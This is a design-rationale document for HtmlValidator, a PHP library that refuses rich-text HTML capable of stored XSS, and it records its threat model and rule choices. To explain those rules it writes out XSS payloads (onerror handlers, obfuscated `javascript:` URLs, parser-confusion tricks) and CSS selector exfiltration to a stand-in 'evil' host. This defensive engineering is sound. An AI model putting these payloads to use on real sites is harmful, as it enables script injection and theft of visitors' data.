# HtmlValidator Design Decisions

Settled decisions with their rationale, all made in 2026-09 while the library was built.
Check here before proposing a feature, a rule change, or a rename. Only the road-not-taken
half is recorded; current behavior is in the source, the docblocks, the changelog, and the
tests. The first two sections are the threat model, for anyone auditing the rules.

Contents:

- [Threat Model](#threat-model)
- [Known Non-Goals](#known-non-goals)
- [Reject, Never Rewrite](#reject-never-rewrite)
- [Tokens, Not Trees](#tokens-not-trees)
- [The Fast Path](#the-fast-path)
- [The Editor Is Not a Layer](#the-editor-is-not-a-layer)
- [Elements: Allowlist. Attributes: Patterns](#elements-allowlist-attributes-patterns)
- [URL Schemes: Ten Attributes, and `javascript:` Everywhere](#url-schemes-ten-attributes-and-javascript-everywhere)
- [Unclosed Markup Rejects](#unclosed-markup-rejects)
- [A `<` in Raw Text Rejects](#a--in-raw-text-rejects)
- [CSS by Regex, Plus Two Selectors](#css-by-regex-plus-two-selectors)
- [`<style>` Is Allowed](#style-is-allowed)
- [Iframes: A Host List](#iframes-a-host-list)
- [Switches Are Static Properties](#switches-are-static-properties)
- [`data:` Images Pass on `<img src>`](#data-images-pass-on-img-src)
- [Word's Prefixed Elements Pass](#words-prefixed-elements-pass)
- [Conditional Comments Are Checked Inside](#conditional-comments-are-checked-inside)
- [No Remove Mode in 1.0](#no-remove-mode-in-10)
- [Keeping Up With New HTML Features](#keeping-up-with-new-html-features)
- [Precedent](#precedent)
- [The Corpus Stays Out of the Repo](#the-corpus-stays-out-of-the-repo)
- [Chrome Double-Checks What Passes](#chrome-double-checks-what-passes)
- [Naming](#naming)

## Threat Model

**Where the content comes from:** anywhere a string can reach a stored HTML field: a form a
visitor filled in, an incoming email, an import, a feed or a supplier's data, a plugin's own
query, a restored backup, an API call, and staff through the editor, its source view or an
HTML field. The check runs on the string and does not know which. A visitor's form and an
email are where hostile input most often arrives; a trusted staff member pasting a payload is
the least likely case, though a staff account writes to every page.

**Where it is called:** at the save, to refuse the content with a reason, and on stored
content before an editor or a page shows it. The second call is the one that matters for the
paths above, since most of them never pass through a save handler. The CMS's job is to warn
above the field in the editor and withhold the content from the page.

**Where it is printed:** into the body of a page in the site's own origin, as HTML, by a
template the site controls: a public page, or the admin page where staff read what a form or
an email brought in. The template may run its own scripts on the same page.

**What an attacker gains:** script in the site's origin, running for every visitor and every
staff member who views the page, with their session. That is the whole attack class the
library exists to stop: stored XSS through a rich-text field.

**What the attacker controls:** the bytes of the field, entirely. They can write anything
the editor lets through (nearly everything, see [The Editor Is Not a
Layer](#the-editor-is-not-a-layer)), they can bypass the editor through source view, an
HTML textbox, or the API, and a form post or an email never passes through an editor at all.

**The rule that follows:** the check must refuse every token that runs script in a current
browser, and every construct where an HTML parser could read the bytes differently from the
tokenizer that checked them. The second half is why the tokenizer follows the HTML Standard
states instead of a regex, and why the elements that change tokenizer state are refused
outright.

**Assumed on the page side:** the content is printed as body HTML. Printed inside an
attribute, a `<script>`, a `<style>` or a `<textarea>`, any text is something else, and no
rule here applies. The CMS template does that correctly today; the library does not try to
guess.

## Known Non-Goals

Each of these was considered and left out on purpose. Every one is a real thing a hostile
author could do; none of them is script.

- **Phishing overlays.** `position: fixed`, `z-index`, a full-page `<div>` and, when the
  forms switch is on, a fake login form. Forms are off by default for this reason; CSS
  layout is not checked because every Word paste and email template uses it.
- **Tracking.** An `<img>` on another host, a CSS `url()` to another host, `ping`, `srcset`.
  An image loads no script. A tracking rule would refuse most real content for no security
  gain.
- **DOM clobbering.** `id` and `name` pass. `<img name="submit">` inside a form shadows
  `form.submit` for a page script that reads it, and `<a id="config">` shadows
  `window.config`. Refusing them would reject anchors and every named element in old
  content; the page's own scripts are the CMS's to write defensively.
- **`target="_blank"` without `rel="noopener"`.** Every current browser defaults to
  `noopener` for `_blank`, so the opener attack no longer exists.
- **Unicode whitespace before a scheme.** `href="&#x2028;javascript:x"`: browsers strip only
  ASCII whitespace and C0 controls from a URL, so the line separator makes it a relative URL
  and nothing runs. `compact()` matches the browsers. Stripping all Unicode format
  characters would be cheap hardening; not done, recorded here in case a browser changes.
- **An exact-match selector guess.** `input[value="admin"] { background: url(//evil/yes) }`
  leaks one yes or no per guess. Accepted as impractical against a token; the substring
  selectors that leak one character at a time are refused.
- **Content size.** No limit; time grows with the size and nothing else (every scan over content
  is linear, and a regex that reaches the PCRE limit refuses the block instead of passing it). Cap
  it at the form or the API.
- **Sense.** Whether the text is blank, wrong, offensive or copied.

## Reject, Never Rewrite

The library reports what is wrong and leaves the content alone, unlike HTMLPurifier, DOMPurify
and every other HTML sanitizer.

1. The person who submitted the content can fix it: they are staff, they have the editor
   open, and the message quotes the tag. When nobody can (an import, an email), the reject
   means the content is withheld and the message says why, instead of a trimmed version
   nobody reviewed going out.
2. A sanitizer rewrites everything it touches: closes tags, normalizes entities, drops every
   element it has no definition for. HTMLPurifier drops every HTML5 element (`section`,
   `figure`, `video`) for that reason. Content that comes back different from what was saved
   is a support ticket nobody can explain.
3. A sanitizer's output has to be re-checked to know it is safe. Accept or reject has no
   output to get wrong.

The price: a sanitizer's re-serialization hides its parser's blind spots (what it misread,
it re-emits encoded). A validator has no such net, so it must refuse every construct where
parsers disagree. That is why the state-switching elements are refused and why the tokenizer
follows the spec.

The mirror image holds for visitor content that gets published as HTML (forum posts,
comments): the author cannot be asked to fix their HTML, so filter it and show what survived. Not this library's
job; the CMS keeps a sanitizer for that audience.

## Tokens, Not Trees

Everything that executes is a token-level fact: a start tag named `script`, an attribute
whose name starts with `on`, an attribute value whose decoded scheme is `javascript`. Tree
construction moves nodes; it never creates a start tag or attribute that was not in the
token stream. So the validator runs the HTML5 tokenizer and never builds a tree: one offset,
one state, the current tag's attributes, nothing retained.

The tree feeds back into the tokenizer only through elements that switch tokenizer state.
Those are handled two ways:

- Raw-text and RCDATA elements (`style`, `iframe`, `noembed`, `noframes`, `xmp`, `textarea`,
  `title`, `noscript`, `script`): the switch depends on the tag name alone, so the tokenizer
  implements those states (scan to the matching end tag). `script` and `plaintext` are
  refused before their state matters; `noscript` is raw text only when scripting is on,
  which is every browser a person uses, so it is refused too.
- Foreign content (`svg`, `math`): the switch depends on the tree (breakout elements,
  integration points), so both are refused outright. Inline SVG in rich text is rare and has
  its own script surface anyway.

With those refused, the tokenizer is context-free: what the spec tokenizer emits for the
bytes is what every browser emits. Two deliberate differences from a browser, both in the
`Tokenizer` docblock: `<script>` content is read with the plain raw-text rule (script-data
escapes only move where `</script>` ends, and the tag was seen either way), and `<svg>` and
`<math>` content is read as HTML (the elements are refused, so it never matters).

Proof: the html5lib tokenizer test suite runs against the tokenizer with element switching
off. Every case passes except the ones that need a parsed DOCTYPE, the script-data and CDATA
states, and four inputs with lone surrogates.

Rejected, measured 2026-09-20:

- `DOMDocument`: libxml2's HTML parser predates HTML5, so what it sees is not what a browser
  sees, and it keeps a whole tree in memory.
- `Dom\HTMLDocument` (PHP 8.4, Lexbor): a real HTML5 parser, but a tree only, with no
  tokenizer or event API and no streaming, about 48 MB peak for 1 MB of input. A tree walk
  misses `<template>` content and sees `<noscript>` parsed with scripting off, so both need
  special cases. At best 2x faster than the check was before the fast path on dense markup,
  so slower than the check is now, and it needs PHP 8.4.
- masterminds/html5 2.11.0: MIT, PHP 7.4+, needs ext-dom, 28 files and 320 KB, with a
  standalone tokenizer behind its `EventHandler` interface. Speed within 20% of ours either
  way: a dependency the size of the library, for a tokenizer we already have.
- A regex over the raw string: CodeIgniter's `xss_clean` is the cautionary tale.

A second parser earns its place as a check on the first, not a replacement. That is the
Chrome cross-check, with a real browser instead of a PHP library.

## The Fast Path

Most of a check is the tokenizer reading tags one at a time, and most tags an editor writes
are `<p>`, `<strong>`, `<a href="...">` and `<img src="...">` with nothing a rule looks at.
So the tokenizer takes an optional anchored regex and, in the data state, steps over whatever
it matches without producing a token. `HtmlValidator` builds that regex from its own tables:
text up to a `<`, a `<` that starts nothing, end tags, and start tags of listed elements whose
attributes are double-quoted and hold no character reference but `&amp;`, no colon (so no
scheme) unless the attribute is a URL attribute and the value starts with a listed scheme,
and, in `style`, none of the punctuation the CSS check reads (`\`, `(`, `@`, `[`, `&`) and
none of its three bare words. Every element that switches the tokenizer's state, every custom
element, every unquoted or single-quoted value and every other character reference falls
through to the tokenizer and is checked as before. The rules stay the only place a decision
is made: the regex can only say "nothing here for them".

The invariant is "a subset of what the rules pass", and `FastPathTest` holds it three ways:
every run the regex skips, checked on its own with the fast path off, passes and tokenizes
to text, start tags and end tags only; the near miss of every rule (a handler, a
`javascript:` URL, a reference in a value, an unquoted value, an unclosed tag, `<style>`,
`<iframe>`, a custom element), placed first in the content, never matches; and the check
reports the same violations with `$fastPath` on and off over the fixtures, every html5lib
tokenizer input and the downloaded corpus. `$fastPath = false` is public so a suspected
difference can be checked in place, and so the benchmark can show both columns.

Measured 2026-09-21 (local i7-14700F, PHP 8.1, PCRE JIT on, `benchmarks/check-speed.php`):
a typical page checks in 0.004 to 0.045 ms against 0.04 to 0.31 ms without the fast path,
the 1 MB tag-dense shape in 2.3 ms against 46.3 ms, and the hostile megabyte of `<` in
2.0 ms against 180 ms, since a `<` that starts nothing is text to the regex too. What remains
of a check on clean content is the byte checks and one regex match. Building the regex costs
about 1 µs, a tenth of a 1 KB check, so it is built once per value of `$allowStyles` and
`$urlSchemes`.

Past `pcre.backtrack_limit` `preg_match()` returns false, and one call over the whole input
gets there on big content. The JIT charges about one unit per skipped tag, so a run of
3-byte tags (`<b>`) reaches the limit at 1 MB. The interpreter (`pcre.jit=0`) charges one
unit per element name it tries, so the same run reaches it at 256 KB, and a run of `<u>` or
`<wbr>`, late in the list, at 32 to 64 KB. After a false the tokenizer runs the regex over
64 KB windows of the input: enough tags per call to keep the speed, sixteen times too few to
reach the limit with the JIT. A windowed call that finds nothing to skip ends the windows, so
content the regex cannot skip (unquoted values, custom elements) never pays for the copies.
A windowed call that reaches the limit anyway (the interpreter on late-named tags) turns the
skip off for the rest of that run, as before. A window can end between `<` and a tag name,
so the lone-`<` branch is `<(?=[^!/?a-z])`, a positive lookahead: a `<` with nothing in view
after it is not text, or `<script>` on a window's edge would pass. FastPathTest pins that.

Measured 2026-09-21 on a dedicated server (Intel Xeon E-2386G; PHP 8.1 and 8.5 give the
same thresholds): 8 MB of dense tags checks in 23 ms against 1.3 s with the skip dropped.
Rejected on the way: a bounded repeat
(`{1,40}+` already fails to compile: PCRE copies the group per repetition and refuses at
64 KB); a subroutine call in a bounded repeat (`(?&i){0,N}+` exhausts the JIT stack at
N=2000 on any input, and at N=500 is 1.3 to 5x slower than a window); windows from the first
call (a copy per call costs nothing on content the regex skips and 10x on content it cannot);
a first-letter trie for the element names (same acceptance; the full check on clean pages
runs 25% faster on the interpreter and no faster with the JIT, so a 200 KB page on a host
without the JIT saves about 1 ms; left for an optimization pass if a host without the JIT
is slow in real use).

Rejected: trying the skip only at "probably safe" spots (a heuristic is a second decision
maker; the regex is exact or it is nothing); the micro-optimizations measured on the way
(`isset` over `in_array` for the element list, `strpos` before `scheme()`: each under 5% of
a check, none worth a line).

## The Editor Is Not a Layer

Measured 2026-09-13 against the CMS's TinyMCE 4 (`verify_html: false`, `entity_encoding:
raw`, `allow_script_urls` off). A save round trip removed only script-capable URL schemes
(`javascript:`, `data:`, entity and whitespace variants) and the head-only elements `<meta>`
and `<base>`. Everything else survived: `<script>`, every `on*` attribute, `<svg onload>`,
`<object>`, `<embed>`, `<template>`, `<iframe srcdoc>`, `<form>`, `<style>` with an external
`url()`, external iframes. The browser also normalized the `<noscript>` and `--!>` comment
tricks into plain live payloads.

So the validator has to catch all of it, and source view, HTML textboxes and the API bypass
the editor anyway. The input and output of that round trip are
`tests/Support/fixtures/tinymce4/`, both reject fixtures.

## Elements: Allowlist. Attributes: Patterns

Elements are an allowlist: the HTML Living Standard's element index, minus everything that
runs script, loads a plugin, belongs in `<head>`, or switches tokenizer state, plus the
obsolete presentational elements browsers still render (`font`, `center`, `strike`, `big`,
`tt`, `marquee` and friends), plus any hyphenated custom element, plus Word's `o:`, `v:` and
`w:` prefixed names. Every other unknown tag is refused. A denylist fails the first time a
browser adds an element; an allowlist fails the other way, which costs one line, not an XSS.
The head-level refusals are not cosmetic: a `<meta http-equiv="refresh">` printed between
two paragraphs navigated the page in Chrome and Firefox on Windows and in Safari on iOS
(checked 2026-09-21).

Attributes are patterns, not a per-element list: `on*` is refused by prefix, `srcdoc` by
name, URL attributes by scheme, `style` by CSS check, and everything else passes. A
per-element attribute allowlist is what makes HTMLPurifier drop HTML5 and reject
`data-*` on the elements it does not know. The prefix also covers handlers browsers add
later (`oncommand`, `onbeforetoggle`, `onscrollend`, `onpagereveal` all arrived after the
sanitizer denylists were written).

Rejected (2026-09-14): refusing every scheme-shaped value on every non-URL attribute, with
a short free-text exception list (`title`, `alt`, `placeholder`, `data-*`, `aria-*`). It
would reject custom element attributes like `subtitle="Price: on request"` and Tailwind
classes like `hover:flex`, and the design follows the spec as it stands: a value the browser
does not read as a URL is not a URL.

## URL Schemes: Ten Attributes, and `javascript:` Everywhere

The URL attributes are the ones current browsers resolve on an allowed element: `href`,
`src`, `action`, `formaction`, `poster`, `ping`, `srcset`, `cite`, `longdesc`, `background`.
On those only `http`, `https`, `mailto`, `tel` or no scheme pass. `data`, `xlink:href`,
`manifest`, `dynsrc` and `lowsrc` are not on the list: they are URLs only on `<object>`,
`<svg>` and `<html>`, all refused, or in no current browser, and `data=` on a custom element
was a real false positive.

The scheme list is the `$urlSchemes` setting, not a constant, because the four defaults are
the schemes every browser handles itself and a site may want `sms:`, `whatsapp:` or an app
link, each of which hands the click to whatever program the visitor's machine has registered
for it. Checked 2026-09-21 in Chrome and Firefox on Windows: a click on a registered scheme
(`sms:`, `ms-settings:`) prompts before the program opens, or opens it at once when the
visitor answered "always" before, and a scheme no program has registered does nothing.
That is the site's call, not the library's: new schemes appear and old programs get
bugs (`ms-msdt:` ran commands on one click in 2022), so a blocklist would never be complete.
`javascript` is refused whatever the list holds, so a line copied from a forum cannot turn
the check off. The fast path pattern is built from the list and cached by it, so a change
after the first check rebuilds it; that matters when a scheme is removed, since the old
pattern would still step over it.

Every other attribute refuses only `javascript:`. The browser ignores it in `title=` or
`data-href=`, but a page script that copies the value into a link or into `location` runs it
(the clickable-row pattern). `vbscript:` runs nowhere and `data:` never runs as the page, so
both pass there.

The scheme is read after removing ASCII whitespace and C0 controls from the whole value,
because browsers do, and after entity decoding, because the tokenizer did it. That closes
`java\nscript:`, `jav&Tab;ascript:`, `javascript&colon;` and `&#106;avascript:` at once.

## Unclosed Markup Rejects

Found by the first corpus tally. A fragment that ends inside a tag (`<img src='//evil?`), a
comment (`<!-- x`), a doctype, or a raw-text element (`<style>` with no end tag) is refused
with `unclosed-markup`. A browser drops the unfinished token at the end of a document, but
the CMS prints a field into a page, so the page up to the next quote becomes the URL that is
fetched (dangling markup exfiltration), an `onerror=` on the open tag runs once the page's
next `>` closes it, or the page up to `-->` or `</style>` disappears.

The tokenizer yields a last `UNCLOSED` token with the byte range; the validator quotes the
source. The html5lib test ignores that token. The rule took the corpus tally from 85 accepted
payloads to 59, and PortSwigger's from 30 to 7.

## A `<` in Raw Text Rejects

The content of `<style>`, `<iframe>` and `<textarea>`, and a comment that is not `<!-- -->`,
is text to a browser, and the check reads it the same way. A `<` inside any of them is refused
anyway (`less-than-in-text`, settled 2026-09-21), because of what re-parses stored content
after the check: `strip_tags()` with an allow list keeps a tag inside raw text as a tag, and
an HTML4-era DOM (libxml2, so PHP's `DOMDocument` and HTMLPurifier) builds an element from
it. Measured with `<img src=x onerror=alert(1)>` inside each construct:

| Text to a browser                      | `strip_tags($html, '<img>')` | `DOMDocument` |
|----------------------------------------|------------------------------|---------------|
| `<style>` content                      | live                         | text          |
| `<iframe>` and `<textarea>` content    | live                         | live          |
| `<!-- -->` comment                     | stripped                     | comment       |
| `<?...>` and `</ x...>` bogus comments | stripped                     | live          |

HTMLPurifier strips the handler, so it never produces a live one; it does turn the text into
markup (`<xmp>show <b>this</b></xmp>` comes out bold). Real comments need no `<` rule, since
every parser reads `<!-- -->` the same way; a conditional comment's inside is checked as
markup instead, see
[Conditional Comments Are Checked Inside](#conditional-comments-are-checked-inside). The cost on real content is zero: of the 700
corpus and fixture files the check accepts with every switch on, the rule refuses 28, all
from XSS payload collections and none from the editor, email and CMS sources.

The rule also covers `<select>` with `$allowForms` on. A tree builder on the pre-2025 spec
(Chrome before 135) ignores a `<style>` or `<iframe>` start tag inside `<select>`, so the
content after it is markup to that browser: `<select><style><img onerror=...></style>` runs
there. The `<` in that content is refused first, so the old parsing never matters.

Rejected: allowing `<xmp>` for code samples. It is raw text like `<style>`, so with this rule
it could hold nothing a `<pre>` cannot, and without the rule its content is exactly the
`strip_tags()` case above. `<xmp>` with encoded content does not work either: raw text is
never entity-decoded, so a browser shows `&lt;b&gt;` as written.

## CSS by Regex, Plus Two Selectors

SvgValidator's `CSS_FORBIDDEN` regex, carried over: the backslash, `@import`, `@charset`,
`image(`, `image-set(`, `src(`, `expression(`, `-moz-binding`, `behavior:`. It works because
the first thing it bans is the backslash: with no escape syntax, every token reads as
written and there is no way to spell `url(` that a regex sees differently from a browser.
Every `url()` gets the scheme check with only `http` and `https` allowed.

Added here (settled 2026-09-14): the substring attribute selectors `[attr^=`, `[attr$=`,
`[attr*=` and `unicode-range`. A `<style>` element with `input[value^="a"] { background:
url(//evil/a) }` leaks an input's value one character per request, and `@font-face` with
`unicode-range` leaks which characters the page shows. Every current browser does this. A
`style` attribute cannot (no selectors), but the check is one regex so it runs on both.
Exact-match selectors, web fonts without `unicode-range`, and external images in the element
stay allowed.

Comments and quoted strings are removed before the regex runs (settled 2026-09-20; removed
rather than blanked to a space since 2026-09-21, because the CSS tokenizer drops a comment
without adding whitespace, so `[*/**/|x^=a]` reads `[*|x^=a]` to a browser, and joining the
text around a string can only add a match). The corpus made the case: email templates draw
comment banners with backslashes, and Word pastes quote font names like `'\@Yu Mincho'`, so
the plain backslash ban refused ordinary content. The removal reads left to right as a CSS
tokenizer does: a string runs to its closing quote or a bare newline, a hex escape eats the
whitespace after it, and an unquoted `url()` runs to its `)` and is stepped over first, so
`content: "/*"` cannot fake a comment opener and neither can `url(/*)` or a quote inside an
unquoted url. Two things stay on the text as written: the `url()` scheme check, since the
target is usually quoted, and a backslash inside a quoted `url()` argument, since an escape
there still spells a scheme. Past the PCRE limits (megabytes inside one comment or string)
removal is skipped and the text is checked as written, which is stricter. The token regex can reach the
limit too (megabytes of `x*|` pairs inside one `[`, on either engine); its false return
refuses the block, since a false read as no match would pass it unchecked. The selector's
name run stops at the next `[` and is possessive, so a run of brackets or of letters is one
step. Before that (fixed 2026-09-21) 100K brackets took 3 s with the JIT and 64 s without,
and a `[` followed by a megabyte of letters returned false without the JIT, so the block
passed.

Also settled 2026-09-20: `behavior:` matches only as a property name, so `scroll-behavior`
and `overscroll-behavior` pass. The `*behavior` and `_behavior` hacks old IE read still
reject.

Rejected: a full CSS tokenizer (MediaWiki runs one; the backslash ban plus the removal makes
it unnecessary), and refusing `position: fixed` and `z-index` (a phishing overlay, not script,
and in every email template).

## `<style>` Is Allowed

Email-style HTML fields put `<style>` in the body, and Word pastes put `mso-*` properties in
`style` attributes. Both pass through the CSS check. Raised again 2026-09-14 over the
selector leak above; settled by refusing the two selectors instead of the element. The
styles switch turns both the element and the attribute off for a site that wants neither.

## Iframes: A Host List

`<iframe>` is a whole document from another origin. It cannot run script in the page's
origin, but it can show anything, so the `src` host must be on `$iframeHosts`, which ships
with YouTube, YouTube's no-cookie host, Vimeo's player and Google Maps, the embeds old
records hold. The match is the whole host after `https://`, `http://` or `//`, then the end
of the value or `/`, `?`, `#`: no port, no userinfo, no subdomain, no suffix. A relative
`src` is refused too, since a same-origin uploaded `.html` or `.svg` runs in the site's
origin. `srcdoc` is refused on every element: it is a document with script allowed.

`<object>`, `<embed>` and `<applet>` are refused with no switch. Flash-era YouTube and Vimeo
codes used `<object>` and `<embed>`, so old records have them, but they do nothing in any
current browser and the record needs the `<iframe>` code anyway.

## Switches Are Static Properties

Three switches (`$allowForms`, `$allowStyles`, `$allowEmbeds`) and two lists (`$iframeHosts`,
`$urlSchemes`) are public static properties on `HtmlValidator`, like SvgValidator's limits.
Set once at startup, read by every `check()`.

Rejected: an `Options` object or a constructor. The CMS has one configuration for the whole
install, the switches are few, and a static property is what SvgValidator's limits already
are. Add an object when a caller needs two configurations in one process, and record here
why.

Defaults: forms off (a fake login form is the one non-script attack a staff member is
likely to try), styles on (Word pastes and email HTML), embeds on (video embeds are in nearly
every site's content).

## `data:` Images Pass on `<img src>`

`data:image/...` on `<img src>` passes, any image type, `svg+xml` included. A browser decodes
an `img` resource as a picture and nothing else: no script, no external loads, no clicks. A
linked `.svg` file in `<img src>` has always passed for the same reason, so the two agree.
Every other `data:` stays refused: `href` and `<iframe>` load it as a page, and `srcset`,
`poster` and CSS `url()` have no paste that needs it. Word pastes through CKEditor keep their
pictures as `data:` URLs, and about a quarter of the corpus's failed for the images alone.

## Word's Prefixed Elements Pass

`<o:p>`, `<v:shape>`, `<w:sdt>` and any other name under Word's three prefixes (`o:` Office,
`v:` VML drawing, `w:` Word) pass as unknown elements, with the normal attribute rules. Word
365 still writes `<o:p>` at the end of every paragraph it copies, so the tags are in most raw
Word pastes, and a WYSIWYG user cannot see them to remove them. Checked 2026-09-21 in
headless Chrome and in PHP 8.4's parser (Lexbor): each is an unknown element in the HTML
namespace, `<v:imagedata src>` loads nothing, and their content parses as ordinary markup.
The VML bugs of the 2000s were in IE's own renderer, and nothing renders VML now.

Every other prefix stays refused. `t:` is the one with a history: IE 5.5 to 9 ran
`<t:set attributeName="innerHTML" to="...">` after a `<?import namespace="t"
implementation="#default#time2">`, so it is in every payload set. `<t:set>` rejects as an
unknown name, and the `<?import>` instruction rejects too, see the next section: in that
engine the prefix it bound was arbitrary, so `<o:set>` would have run the same way.

## Conditional Comments Are Checked Inside

`<!--[if mso]> ... <![endif]-->` is a comment to every browser since IE 10. Two engines
still read the markup inside it: the IE engine embedded in old Windows programs (the
WebBrowser control, in IE7 mode by default) and Outlook's Word engine, which is why every
HTML email template uses `<!--[if mso]>` for Outlook-only tables and VML buttons. So the
inside gets the same rules as the content around it, from the first `]>` to `<![endif]`: an
email template's `<!--[if mso]><table>` passes, `<!--[if IE]><script>` rejects. In the
corpus, script inside a conditional comment appears only in attack sets; the 6 email
templates and 30 Word pastes that use them hold tables, VML and list markers.

The same engine is why `<?import namespace="x" implementation="...">` rejects
(`element-not-allowed`, as written). It bound a behavior such as HTML+TIME or VML to a
prefix in IE 5.5 to 9, and the prefix was arbitrary, so with Word's prefixes allowed it would
have made `<o:set>` run like `<t:set>`. The other way to bind one, the `behavior:` CSS
property, is refused by the CSS check. No real content in the corpus has `<?import>`.

## No Remove Mode in 1.0

A "remove unsafe code" button is a CMS feature for after the first release. When it comes:
a second entry point that returns the input with every offending token's byte range deleted
(a refused start tag through its matching end tag for raw-text elements, otherwise the tag
alone; an offending attribute alone). The tokenizer's byte offsets already make that cheap.
Until then, a full clean is HTMLPurifier's job.

## Keeping Up With New HTML Features

What changes year to year is tree construction and attribute names, never the tokenizer
states. Checked 2026-09-14:

| Recent change                                                             | Effect on sanitizers                             | Effect here                                       |
|---------------------------------------------------------------------------|--------------------------------------------------|---------------------------------------------------|
| new handlers: `oncommand`, `onbeforetoggle`, `onscrollend`, `onpagereveal` | handler-name denylists go stale                  | `on*` prefix, no name list                        |
| `<select>` parser relaxation (Chrome 135)                                 | tree builder no longer drops `<img>` in `<select>` | no tree; a start tag is a start tag wherever it is |
| declarative shadow DOM `<template shadowrootmode>`                        | template content is no longer inert              | `template` refused                                |
| `popovertarget`, `command`, `commandfor`, `formaction`                    | dialogs and form submits without script          | not script; forms grouped, overlays a non-goal    |
| `ping`, `srcset`, CSS `attr()`                                            | requests without script                          | in the URL attribute list; `attr()` in `url()` is not valid CSS |
| `<math>` and `<svg>` namespace confusion (mXSS)                           | different tree on the second parse               | both refused, and there is no second parse        |

The one real gap is a future URL-bearing attribute on an allowed element. Closed by running
the `javascript:` check on every attribute value, not only the named URL attributes.

## Precedent

Token-stream validators and sanitizers with no tree: bluemonday (Go, on the `x/net/html`
tokenizer), the OWASP Java HTML Sanitizer (explicitly streaming), and html5lib's sanitizer
(a Python token filter, which bleach was built on). The bypasses in this class of tool came
from attribute values and entity decoding handled outside the tokenizer's states. That is
why the tokenizer here is written from the spec's state list and run against html5lib's
suite.

## The Corpus Stays Out of the Repo

The rules were checked against public XSS payload lists downloaded by
`tools/fetch-corpus.php` into a gitignored folder and scored by `tools/tally.php`: the
PortSwigger cheat sheet (copyrighted, downloaded for local testing only), html5sec.org,
DOMPurify's fixtures including its mXSS cases, and the OWASP filter evasion sheet (CC BY-SA).
Nothing from the corpus is copied into `tests/`. Running a check against a payload on a
developer's machine is a use those terms allow; the payload lists stay out of the repo, and
`tools/corpus-known.json` keeps a hash and a note per reviewed case. For the openly licensed
lists it also keeps an excerpt of under 100 characters so a person can see which case a note
is about. The PortSwigger cheat sheet is copyrighted and not licensed for redistribution, so
its entries keep only the hash and the note, with no text from the page, not even a short
excerpt. The cheat sheet is a resource many security teams depend on, and copying none of it
is the simplest way to respect that. The fetch tool keeps each
source's license text next to its files, and the committed fixtures are our own: one per
error code, the TinyMCE round trip, and the accept set written from the ideas the corpus
surfaced.

The html5lib tokenizer suite is the exception: it is MIT, so it is committed under
`tests/Support/fixtures/html5lib/` with its license file.

## Chrome Double-Checks What Passes

The rules read our own tokenizer's tokens, so a tokenizer bug that reads a tag differently
from a browser could pass a script. `ChromeCrossCheckTest` is the test for that day: every
fragment the check accepts (the fixtures, the html5lib inputs and the corpus) is parsed by
headless Chrome, and the tree Blink builds must hold no script element, no `on*` attribute
and no `javascript:` URL. One Chrome run does all of them: the fragments go into a harness
page as JSON, the page parses each with `DOMParser` and walks the tree, and `--dump-dom`
carries the findings back. A `DOMParser` document has scripting off, so `<noscript>` content
is parsed as markup, and the walk enters `<template>` content, so neither hides anything.

Chrome, not a PHP parser, because a browser is the thing the check protects against: a
script Chrome does not see is not a script. PHP 8.4's `Dom\HTMLDocument` (Lexbor) was the
earlier plan and needs nothing installed, but Chrome is on every CI runner except Linux on
ARM, where Google ships no build and the test skips. Without Chrome the test fails when `CI`
is set and skips elsewhere, so a contributor's first run stays green.

## Naming

`HtmlValidator`, `itools/htmlvalidator`, `Itools\HtmlValidator`, following SvgValidator and
the other sibling libraries: CamelCase folder, repo and namespace, lowercase Packagist name
with no hyphen. Neither library validates in the W3C sense; the name pairs the two and the
description carries the meaning ("rejects HTML that could run script").

Error codes are lowercase, hyphenated, one per rule, and never renamed once released,
because applications map them to their own messages. The codes shared with SvgValidator
(`not-utf8`, `element-not-allowed`, `event-handler`, `attribute-not-allowed`,
`css-not-allowed`) mean the same thing in both.
